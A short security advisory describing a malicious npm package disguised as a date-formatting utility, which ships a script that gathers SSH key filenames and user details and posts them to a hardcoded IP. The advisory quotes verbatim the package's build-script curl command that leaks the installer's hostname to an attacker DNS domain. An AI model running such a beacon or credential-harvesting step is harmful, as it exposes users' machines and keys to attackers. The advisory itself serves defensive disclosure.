summary: Cover-story npm package ships SSH key exfiltrator and DNS hostname beacon
details: Package advertises itself as 'a simple date formatting utility' with a trivial 7-line index.js, but the tarball ships postinstall.js which enumerates the installer's ~/.ssh directory and POSTs the collected SSH key filenames, username, and platform to a hardcoded bare-IP endpoint at https://124.221.154.135/post. package.json additionally declares a `build` script that runs `curl http://$(hostname).admin12345.eyes.sh`, leaking the installer's hostname as a DNS subdomain to an attacker-controlled DNS canary domain. Comments inside postinstall.js are in Chinese and explicitly reference 'C2' and 'attacker server'. While postinstall.js is not currently wired to an npm lifecycle hook (only `build` is declared), the file is staged in the package, the cover-story mismatch between advertised purpose and shipped code is unambiguous, and any consumer who runs the shipped `build` script (or trivially-repackaged variant that wires the file to a lifecycle hook) will execute the SSH exfiltration. The package has no legitimate purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
